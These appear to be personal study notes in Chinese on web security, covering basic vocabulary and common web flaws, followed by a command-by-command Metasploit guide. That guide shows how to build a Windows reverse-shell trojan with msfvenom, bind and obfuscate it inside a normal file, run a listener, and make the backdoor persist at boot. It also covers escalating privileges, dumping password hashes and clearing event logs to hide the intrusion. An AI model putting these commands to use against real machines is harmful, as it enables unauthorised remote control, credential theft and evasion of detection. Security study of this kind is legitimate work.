# WEB 網路安全-筆記

## WEB基礎名詞介紹
- 前端: 瀏覽器所看的的內容 (HTML、CSS、JS)
- 後端: 部屬在伺服器上的程序 (Php、Python、Nodejs...)
- 數據庫: 存放數據的容器 (MySQL、MongoDB...)
- 協議: 規定好的通訊、交流的方式 (http、https)
- 伺服器: 性能非常好的電腦 (可以同時處理多人訪問)
- WEB漏洞: 前端、後端、協議、數據庫產生問題
- IP地址: Internet Protocol Address 網路協議地址，全球唯一
- 端口: 0-65535 每一個軟體的一個通訊的進出口
- LAN: (Local Area Network)
    
    - 192.168.*.*
    - 172.16.*.*-172.31.*.*
    - 10.*.*.*

- WAN: (Metropolitan Area Network)
- URL: (Uniform Resource Location)統一資源定位符
- MAC地址: Media Access Control 介質訪問控制符，全球唯一
- 映射/端口映射: 將內網的IP地址(端口)轉變成外(公)網IP地址(端口)
- 域名/DNS: IP地址別名，透過DNS服務器將IP轉換成域名
- 網卡/網關
- IPv4/IPv6
- 瀏覽器: 訪問網頁的應用程式
- Linux/Windows: 管理硬體與軟體的操作系統(Operating System,OS)軟體
        
    - Linux多為命令行介面/Windows多為圖形介面

- 系統漏洞: 操作系統代碼出現BUG、漏洞
- 虛擬機/Docker: 虛擬一個操作系統(VMWare、VirtualBox...)，Docker為虛擬系統容器(應用軟體)
- 橋接/NAT: 虛擬機與主機是平級關係(同一個網段)/虛擬機與主機是父子關係
- Shell/webshell: Shell就是一個控制操作電腦的命令行介面/通過網頁行式控制操作電腦的命令行網頁介面
- 正向/反向Shell: 黑客主動連接受害者/受害者主動連接黑客
- 弱口令/字典/暴力破解: 強度比較弱的密碼(Ex:123456)/一系列的密碼/一個一個嘗試破解
- Cookie/Session: 數據存放在客戶端/數據存放在伺服器，都是保存狀態的文件或是數據
- ByPass: 繞過
- 0Day漏洞: 最新產生的漏洞
- 攻擊、入侵、滲透: 獲取目標的信息、Shell或是把目標打死
- DDOS: 拒絕服務攻擊
- 肉雞: 黑客已經攻擊佔領的電腦
- 代碼審計: 看代碼找漏洞、BUG，審計工具幫助安全人員快捷找BUG、漏洞
- CTF: Capture The Flag 奪旗賽，黑客殿堂賽事(線上)
- AWD: Attack With DefenCe 線下賽事
- 靶機: 搭建好的漏洞測試環境的電腦
- CMS: 內容管理系統、簡稱後台
- 滲透、攻擊工具: (Kali、sqlmap、Burpsuit...)，有需要再學還是須先了解原理
- 後滲透: 攻擊完後，建立持久訪問


## 初識WEB前端語言以及潛在漏洞

- 甚麼是HTML

    - Hyper Text Markup Language 超文本標記語言
    - 標籤皆以成對的方式編寫


- HTML潛在漏洞

    - 純HTML基本沒有漏洞
    - Iframe clickjack

- CSS 

    - Cascading Style Sheet: 層疊樣式表

- CSS潛在漏洞

    - 純CSS的漏洞幾本上也是沒有
    - 輸入框監測: https://github.com/maxchehab/CSS-Keylogging

- JavaScript

    - 一種腳本語言，可以將網頁實現複雜動態功能
    - 文件、HTML、DOM、cookie、數據操作等用途

- JavaScripts潛在漏洞

    - 純JS存在許多漏洞
    - XSS
    - 重要: 必學JS以及潛在漏洞

## 初識WEB後端語言及潛在漏洞

1. 甚麼是後端(Back-end)
    - 用戶無法直接看到，並在伺服器上運行的一個應用程式

2. 後端種類(語言)
    - PHP、JAVA、PYTHON、C/C++/C#...

3. 後端框架
    - 甚麼是框架: 快速開發、低耦合便於維護，類似在操作系統上面寫代碼
    - 例如: ThinkPhp、Django(Python)、Flask(Python)、SSH(JAVA)...

4. 後端有哪些潛在漏洞:
    - 權限鑑權
    - SQL注入
    - 邏輯漏洞
    - 其他漏洞

5. 自學內容
    - 學習框架

## SQL注入&繞過原理

1. 甚麼是SQL
    - SQL(Structured Query Language)結構化查詢語言，使我們有能力訪問數據庫

2. 甚麼是SQL注入
    - 用戶提交的數據可以被數據庫解析執行

3. 加強自學內容
    - 了解SQL語句
    - 透過SQL語句繞過資料庫執行漏洞

4. 補充: NoSQL注入

## XSS漏洞原理

1. 甚麼事XSS
    - XSS(Cross Site Script)跨站腳本攻擊，網頁內嵌入HTML、CSS、JS代碼

2. XSS類型
    - 反射型: 前端-> 後端 -> 前端
    - 儲存型: 前端 -> 後端 -> 資料庫 -> 前端
    - DOM型: 前端

3. XSS舉例:
    - 再輸入框輸入 ```<script>alert(1)</script>```
    - 進階: 綁定Beef轉換成監聽木馬

## CSRF漏洞原理

1. 甚麼是CSRF
    - CSRF(Cross Site Request Forgery)跨站請求違造，攻擊者盜用你的身份，以你的名義發送惡意請求

## WEBCAM入侵原理
- 結合網路以及攝影機技術所產生的新一代攝影機，其實只要連線上網路的設備滲透原理基本上都是相通的

1. 如何發掘
    - 搜尋活耀IP
    - 端口掃描
    - 指紋篩選
    - 暴力破解、字典破解 

## 代碼審計漏洞

1. 甚麼是代碼審計
    - 透過檢查源代碼發現發現源代碼缺陷引發的安全漏洞

2. 提升方向
    - 熟悉編程語言
    - 熟悉風險代碼操作
    - 熟悉設計模式

## 文件包含漏洞

1. 甚麼是文件包含漏洞
    - 本地/遠程文件包含檔案(include)

## SSRF漏洞

1. 甚麼是SSRF
    - SSRF(Server-Side Request Forgery)服務端請求偽造    

## 參考資料
- https://www.youtube.com/playlist?list=PLgZqc0esdeS-NJms7NYexeMHKLpfAi5HY

# Metasploit
- kali Linux 自帶的後門木馬管理工具

## 操作流程

### 1. 啟動Metasploit
```cmd
msfconsole
```
- -q 省略開啟時的文字訊息

### 2. 使用模組
```cmd
use exploit/multi/handler
```
- 可以透過 show options 展示當前配置

### 3. 設置模組
```cmd
set lhost ip
set lport port (默認4444)
set payload (payload)
set exitonsession false: 支持多線呈操作
```
- 透過 show payloads 展示所有可用payload

### 4. 製作木馬
```cmd
msfvenom -p windows/x64/meterpeter/reverse_tcp -f exe -a x64 --platform windows -o ./demo.exe lhost=ip lport=port 
```
- -p: payload 使用的漏洞
- -f: file 輸出格式
- -o: output 輸出路徑
- -x: 綑綁文件路徑(綑綁正常文件，當目標使用該檔案後就會開啟程序)
- -k: Keep 維持原綑綁文件功能，同時間執行木馬程序
- -e: encoder 利用混淆器
- -i: 混淆次數
- payload、lhost、lport必須與設置的一樣
- msfvenom -h: 協助文件
- msfvenom -l (預查詢指令): 將需要查詢的命令list值

    #### todo: 製作自動化木馬生成工具
    - 參考資料: https://www.youtube.com/watch?v=40yitejayBQ&list=PLgZqc0esdeS9UyK_QPoCO5wIZ_XYAkCV5&index=4

    #### 補充-DLL劫持
    - https://www.youtube.com/watch?v=9V-Z1PPuVcg&list=PLgZqc0esdeS9UyK_QPoCO5wIZ_XYAkCV5&index=8

### 5. 啟動監聽
```cmd
run 
```
- run -j: 背景監聽
- jobs: 顯示當前上線啟用程序的電腦列表
- jobs -h: 操作命令列表
- session -i (id): 選中操控的電腦(透過id)
- background/bg: 退出選中回到背景
- jobs -K: 關閉監聽

### MSF木馬持久化
- show advanced: 顯示高級指令
- 第一次連線完成後: 出現 meterpreter > 後執行以下指令
```cmd
run persistence -X
```
- -X: 開機後自動啟動木馬
- -i: 目標每隔幾秒自動連線

## 連線後操作
- help: 列出全部操作指令
- getsystem: 提權 / rev2self: 改回使用者權限
    - run post/windows/gather/hashdump: dump該裝置目前使用者權限以及密碼 hash值
- 離開操作前記得把日誌刪掉: clearev 指令
- portfwd: 端口轉發，將目標機台的某個端口轉到其他設備端口連接

## MSF連接多個木馬
- sessions: 觀看當前有多少電腦啟用程序


## 參考資料: 
- https://www.youtube.com/playlist?list=PLgZqc0esdeS9UyK_QPoCO5wIZ_XYAkCV5

